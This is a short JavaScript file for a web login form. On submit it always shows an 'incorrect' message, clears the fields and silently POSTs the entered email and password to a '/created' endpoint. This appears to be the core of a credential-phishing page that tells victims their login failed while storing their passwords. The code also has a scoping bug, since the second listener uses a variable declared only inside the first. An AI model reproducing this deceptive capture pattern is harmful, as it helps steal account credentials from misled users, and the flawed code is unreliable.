document.getElementById('form').addEventListener('submit', async (e) => {
    const incorrecto = document.getElementById('incorrecta')
    incorrecto.style.display = 'block'
    e.preventDefault();
    let {email, password} = e.target
    const userData = {
        email: email.value, 
        password: password.value 
    };
    email.value  = ""
    password.value = ""
    try {
        const response = await fetch('/created', {
            method: 'POST',
            headers: {
                'Content-Type': 'application/json'
            },
            body: JSON.stringify(userData)
        });
        const data = await response.json();
        console.log(data);
    } catch (error) {
        console.error('Error:', error);
    }
});

document.getElementById('pass').addEventListener('click', () => {
    incorrecto.style.display = 'none'
})